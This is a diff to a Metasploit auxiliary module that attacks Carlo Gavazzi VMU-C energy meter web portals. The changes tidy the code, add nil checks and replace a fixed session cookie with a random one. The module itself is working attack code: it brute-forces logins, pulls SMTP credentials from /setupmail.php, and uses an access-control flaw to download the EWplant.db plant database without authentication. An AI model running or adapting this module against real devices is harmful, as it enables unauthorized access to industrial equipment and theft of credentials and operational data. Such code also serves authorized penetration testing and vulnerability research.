@@ -13,9 +13,9 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-      'Name' => 'Carlo Gavazzi Energy Meter - Login Brute Force, Extract Info and Dump Plant Database',
+      'Name' => 'Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database',
       'Description' => %{
-        This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, will gather device firmware version and attempt to extract SMTP configuration. A valid, admin privileged user is required to extract SMTP password. In some older versions, SMTP config can be retrieved without any authentication. The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump EWplant.db database file - this db file contains information such as power/energy utilization data, tariffs, and revenue statistics. Vulnerable firmware versions - VMU-C EM prior to firmware Version A11_U05 and VMU-C PV prior to firmware Version A17.
+        This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration. A valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication. The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db . This db file contains information such as power/energy utilization data, tariffs, and revenue statistics. Vulnerable firmware versions include - VMU-C EM prior to firmware Version A11_U05 and VMU-C PV prior to firmware Version A17.
       },
       'References' =>
         [
@@ -53,7 +53,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   #
-  # What's the point of running this module if the target actually isn't Carlo Gavazzi EOS Web
+  # What's the point of running this module if the target actually isn't Carlo Gavazzi box
   #
 
   def is_app_carlogavazzi?
@@ -70,7 +70,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if (res && res.code == 200 && (res.body.include?('Accedi') || res.body.include?('Gavazzi') || res.body.include?('styleVMUC.css') || res.body.include?('VMUC')))
-      vprint_good("#{rhost}:#{rport} - Running Carlo Gavazzi Energy Meter Web Management portal...")
+      vprint_good("#{rhost}:#{rport} - Running Carlo Gavazzi VMU-C Web Management portal...")
       return true
     else
       vprint_error("#{rhost}:#{rport} - Application is not Carlo Gavazzi. Module will not continue.")
@@ -111,13 +111,18 @@ class MetasploitModule < Msf::Auxiliary
 
   def do_login(user, pass)
     vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
+
+    # Set Cookie - Box is vuln to Session Fixation. Generating a random cookie for use.
+    randomvalue = Rex::Text.rand_text_alphanumeric(26)
+    cookie_value = 'PHPSESSID=' + "#{randomvalue}"
+
     begin
       res = send_request_cgi(
         {
           'uri'       => '/login.php',
           'method'    => 'POST',
           'headers'   => {
-            'Cookie' => 'PHPSESSID=xxe32qk2gbkfn3ur2nm7ypmgyp'
+            'Cookie' => cookie_value
           },
           'vars_post' =>
             {
@@ -143,7 +148,7 @@ class MetasploitModule < Msf::Auxiliary
             'uri' => '/setupfirmware.php',
             'method' => 'GET',
             'headers' => {
-              'Cookie' => 'PHPSESSID=xxe32qk2gbkfn3ur2nm7ypmgyp'
+              'Cookie' => cookie_value
             }
           }
         )
@@ -154,34 +159,40 @@ class MetasploitModule < Msf::Auxiliary
 
       if (res && res.code == 200 && res.body.include?('Firmware Version'))
         fw_ver_dirty = res.body.match(/Firmware Version(.*)(.*)td/)
-        fw_ver_clean = "#{fw_ver_dirty}".match(/Ver. (.*)[$<]/)[1]
-        vprint_status("#{rhost}:#{rport} - Firmware version #{fw_ver_clean}...")
 
-        report_cred(
-          ip: rhost,
-          port: rport,
-          service_name: "Carlo Gavazzi Energy Meter [Firmware ver #{fw_ver_clean}]",
-          user: user,
-          password: pass
-        )
+        if !fw_ver_dirty.nil?
+          fw_ver_clean = "#{fw_ver_dirty}".match(/Ver. (.*)[$<]/)[1]
+          print_good("#{rhost}:#{rport} - Firmware version #{fw_ver_clean}...")
+
+          report_cred(
+            ip: rhost,
+            port: rport,
+            service_name: "Carlo Gavazzi Energy Meter [Firmware ver #{fw_ver_clean}]",
+            user: user,
+            password: pass
+          )
+        end
       end
 
       if (res && res.code == 200 && res.body.include?('Versione Firmware Installata'))
         fw_ver_dirty = res.body.match(/Ver. (.*)[$<]/)
-        fw_ver_clean = "#{fw_ver_dirty}".match(/[^Ver. ](.*)[^<]/)
-        vprint_status("#{rhost}:#{rport} - Firmware version #{fw_ver_clean}...")
 
-        report_cred(
-          ip: rhost,
-          port: rport,
-          service_name: "Carlo Gavazzi Energy Meter [Firmware ver #{fw_ver_clean}]",
-          user: user,
-          password: pass
-        )
+        if !fw_ver_dirty.nil?
+          fw_ver_clean = "#{fw_ver_dirty}".match(/[^Ver. ](.*)[^<]/)
+          print_good("#{rhost}:#{rport} - Firmware version #{fw_ver_clean}...")
+
+          report_cred(
+            ip: rhost,
+            port: rport,
+            service_name: "Carlo Gavazzi Energy Meter [Firmware ver #{fw_ver_clean}]",
+            user: user,
+            password: pass
+          )
+        end
       end
 
       #
-      # Extract SMTP password
+      # Extract SMTP config
       #
 
       begin
@@ -190,7 +201,7 @@ class MetasploitModule < Msf::Auxiliary
             'uri'       => '/setupmail.php',
             'method'    => 'GET',
             'headers'   => {
-              'Cookie' => 'PHPSESSID=xxe32qk2gbkfn3ur2nm7ypmgyp'
+              'Cookie' => cookie_value
             }
           }
         )
@@ -207,9 +218,12 @@ class MetasploitModule < Msf::Auxiliary
         smtp_user = dirty_smtp_user.match(/[$"](.*)[$"]/)
         dirty_smtp_pass = res.body.match(/passwordsmtp" value=(.*)[$=]/)[1]
         smtp_pass = dirty_smtp_pass.match(/[$"](.*)[$"]/)
-        print_good("#{rhost}:#{rport} - SMTP server #{smtp_server}, SMTP username #{smtp_user}, SMTP password #{smtp_pass}")
+
+        if (!dirty_smtp_server.nil?) && (!dirty_smtp_user.nil?) && (!dirty_smtp_pass.nil?)
+          print_good("#{rhost}:#{rport} - SMTP server: #{smtp_server}, SMTP username: #{smtp_user}, SMTP password: #{smtp_pass}")
+        end
       else
-        print_error("#{rhost}:#{rport} - SMTP password not retrieved. Check if the user has 'admin' privileges")
+        vprint_error("#{rhost}:#{rport} - SMTP config could not be retrieved. Check if the user has administrative privileges")
       end
       return :next_user
     else
@@ -218,7 +232,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   #
-  # Dump EWplant.db database file
+  # Dump EWplant.db database file - No authentication required
   #
 
   def ewplantdb
@@ -226,10 +240,7 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_cgi(
         {
           'uri' => '/cfg/EWplant.db',
-          'method' => 'GET',
-          'headers' => {
-            'Cookie' => 'PHPSESSID=xxe32qk2gbkfn3ur2nm7ypmgyp'
-          }
+          'method' => 'GET'
         }
       )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
@@ -238,11 +249,8 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if res && res.code == 200
-      vprint_status('++++++++++++++++++++++++++++++++++++++')
-      print_good("#{rhost} - dumping EWplant.db")
-      vprint_status('++++++++++++++++++++++++++++++++++++++')
-
-      print_good("#{rhost}:#{rport} - File retrieved successfully!")
+      print_status("#{rhost} - dumping EWplant.db")
+      print_good("#{rhost}:#{rport} - EWplant.db retrieved successfully!")
       path = store_loot(
         'EWplant.db',
         'SQLite_db/text',
@@ -251,9 +259,9 @@ class MetasploitModule < Msf::Auxiliary
         rport,
         'Carlo Gavazzi Energy Meter - EWplant.db'
       )
-      print_status("#{rhost}:#{rport} - File saved in: #{path}")
+      print_good("#{rhost}:#{rport} - File saved in: #{path}")
     else
-      print_error("#{rhost}:#{rport} - Failed to retrieve file. Set a higher HTTPCLIENTTIMEOUT and try again.")
+      vprint_error("#{rhost}:#{rport} - Failed to retrieve EWplant.db. Set a higher HTTPCLIENTTIMEOUT and try again. Else, check if target is running vulnerable version.?")
       return
     end
   end
